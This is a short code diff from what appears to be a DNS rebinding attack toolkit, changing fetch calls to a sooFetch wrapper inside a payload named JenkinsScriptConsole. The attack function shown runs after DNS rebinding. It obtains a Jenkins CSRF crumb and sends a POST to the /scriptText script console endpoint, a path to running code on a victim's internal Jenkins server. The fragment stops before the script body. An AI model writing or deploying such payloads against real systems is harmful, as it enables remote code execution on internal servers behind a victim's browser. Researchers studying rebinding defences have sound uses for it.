@@ -11,7 +11,7 @@ const JenkinsScriptConsole = () => {
 
     // Invoked after DNS rebinding has been performed
     function attack(headers, cookie, body) {
-        fetch('/crumbIssuer/api/json')
+        sooFetch('/crumbIssuer/api/json')
 			.then(responseOKOrFail("Could not fetch CSRF token"))
 			.then(function (body) {
 				console.log("crumb response: " + body);
@@ -23,7 +23,7 @@ const JenkinsScriptConsole = () => {
 				myHeaders.append("content-type", "application/x-www-form-urlencoded");
 				myHeaders.append(crumbRequestField, crumb);
 
-        		return fetch('/scriptText', {
+        		return sooFetch('/scriptText', {
 		            method: 'POST',
 		            headers: myHeaders,
 		            /**
